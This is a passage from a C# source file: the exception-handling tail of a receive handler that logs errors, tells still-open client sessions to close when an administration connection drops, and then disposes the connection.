                    }
                }
            }
            catch (Exception ex)
            {
                if (Logger.IsDebugEnabled)
                    Logger.Debug(ex, "Exception occurred in administration AI-{0} receive handler", Id);
                else if (!(ex is EndOfStreamException))
                    Logger.Fatal(ex, "Exception occurred in administration AI-{0} receive handler", Id);

                if (_openClientSessions.Count > 0)
                {
                    Logger.Info(
                        "Administration AI-{0} is disconnecting but has still opened sessions. Closing open sessions ({1} session{2})",
                        Id, _openClientSessions.Count, _openClientSessions.Count > 1 ? "s" : "");

                    foreach (var openClientSession in _openClientSessions)
                    {
                        SendPackageToClient?.Invoke(this,
                            new SendPackageToClientEventArgs(openClientSession,
                                (byte) FromAdministrationPackage.CloseSession, new WriterCall(BitConverter.GetBytes(Id))));
                    }
                    Logger.Debug("Open sessions closed");
                    _openClientSessions.Clear();
                }

                Dispose();
            }
        }
    }
}